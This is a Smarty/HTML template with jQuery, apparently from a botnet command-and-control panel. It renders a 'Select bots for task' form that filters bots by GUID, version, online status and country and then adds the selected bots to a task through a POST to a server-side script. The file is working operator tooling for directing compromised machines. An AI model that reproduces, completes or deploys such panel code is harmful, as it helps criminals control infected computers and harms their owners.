{if isset($TASK)}<center>
<h1>Select bots for task #{$TASK}</h1>
<form id='frm_findbots' onsubmit='return false;'>
<input type='hidden' value='{$TASK}' name='task'>
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240); width:700px;" border="1" cellpadding="3" cellspacing="0">
<tr><td align="left" style='width:100px;'><b>Bot GUID :</b></td>
<td align="left" >
	<div><span style="margin-left: 0px;"><input type="text" value="" name="bot_guid" id="bot_guid" style="width: 100%;"></span></div>
</td></tr>
<tr><td align="left" style='width:100px;'><b>Bot ver :</b></td>
<td align="left" >
	<div><span style="margin-left: 0px;">
		<select name="bot_ver" id="bot_ver" style="width: 100%;font-size:10px">
		{if isset($VERS)}
			<option value=''>all versions</option>
			{foreach from=$VERS item=ver}
				<option value='{$ver.ver_bot}'>{$ver.ver_bot}</option>
			{/foreach}
		{else}
			<option value='1'>There are no bots!</option>
		{/if}
		</select>
	</span></div>
</td></tr>
<tr><td align="left">
	<b>Limit :</b></td>
	<td align="left"><input type="text" value="10" name="limit" id="limit" style="width: 50px;"></td></tr>
<tr>
	<td align="left"><b>Options :</b></td>
	<td align="left">
		<table cellspacing="0" cellpadding="0"><tr>
			<td><input type="checkbox" checked name="onlyonline" id="onlyonline" style="width: 20px;"></td>
			<td> Only online</td>
		</table>
	</td>
</tr>

	<tr align='left'>
	<td colspan="2">
	<FIELDSET><LEGEND align="center"><a href='javascript:void();' onclick='showCountries();'><b>Countries</b></a>:</LEGEND>
	<div id='ext_countries'><center><a href='javascript:void();' onclick='showCountries();'><i>click here to view countries list</i></a></center></div>
	<div id='countries' style='display:none;text-align:center;'>
	&nbsp;<a href="javascript:void(0)" onClick="CheckAll('fk_country', true);">Select All</a> &nbsp;&nbsp;
	<a href="javascript:void(0)" onClick="CheckAll('fk_country', false);">Unselect All</a>
	<table align='center'>
	<tr valign="top">

	{foreach from=$CONT_ARR item=ELEM}
	<td>
	<table border='1' cellspacing='0' cellpadding='1' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>

	{foreach from=$ELEM item=REC}
	<tr>
	<td width='20px' align="center"><input type="checkbox" id="idCntr{$REC.MRES_IC}" name="fk_country[{$REC.MRES_IC}]"></td>
	<td width='30px' align="center"><label for="idCntr{$REC.MRES_IC}"><img border='0' src='img/flags/{$REC.CCODE}.gif'></label></td>
	<td width='100px'>&nbsp; <label for="idCntr{$REC.MRES_IC}">{$REC.MRES_NAME}</label></td>
	</tr>


	{/foreach}
	</table></td>
	{/foreach}
	</tr>
	</table>
	</div>
	</FIELDSET></td>
	</tr>
<tr><td colspan='2' align='center'><input type='button' id='search_bots' value='Get Bots'></td></tr>
<tr id='finded_bots'><tr>
</table><br>
<div class='error' id='error2'></div>
<div id='add_bots' class='ok'></div>
<input type='submit' value='Add to Task'> &nbsp; 
<input type='button' value='Close' onClick='Close();'>
</form>

{literal}
<script>
function AddBotsToTask() 
{
	f = document.getElementById('frm_bots');
	res = ''; var c = 0;
	for (var i = 0; i < f.elements.length; i++) 
	{
		if(f.elements[i].type == 'checkbox' && f.elements[i].name.substr(0, 4) == 'bots' && f.elements[i].checked == true)
		{
			name = f.elements[i].name;
			posa = name.indexOf('[')+1;
			posb = name.indexOf(']') - posa;
			bid = name.substr(posa,posb);
			tr = document.getElementById('tr'+bid);
			res += "<tr id='t'+bid>"+tr.innerHTML+"</tr>";
			c++;
		}
	}
	if( res != '')
	{
		$("#bots_table tr:last").after(res);
		$('#bots_table tr:contains("There are no selected bots!")').hide();
	}
	return c;
}
$("#frm_findbots").submit(function() 
{
	count = AddBotsToTask();
	if( count > 0 ) $("#add_bots").html(count+' bots added to list<br><br>');
	else $('#error2').html('Plz, select bots!<br><br>');
	return false;
});

$("#search_bots").click(function() 
{
    pdata = $('#frm_findbots').serialize(true);
    $.post('./mod/select_bots.php', pdata, function(data) { $("#finded_bots").html(data); });
    return false;
});
function SelectAll(name, checked) 
{
	f = document.getElementById('frm_findbots');
	for (var i = 0; i < f.elements.length; i++) {
		if(f.elements[i].type == 'checkbox' && f.elements[i].name.substr(0, name.length) == name){
			f.elements[i].checked = checked;
		}
	}
}
function CheckAll(name, checked) 
{
	f = document.getElementById('frm_findbots');
	for (var i = 0; i < f.elements.length; i++) 
	{
		if(f.elements[i].type == 'checkbox' && f.elements[i].name.substr(0, name.length) == name)
		{
			f.elements[i].checked = checked;
		}
	}
}
</script>
{/literal}
{else}
<font class='error'>Task not found!</font>
{/if}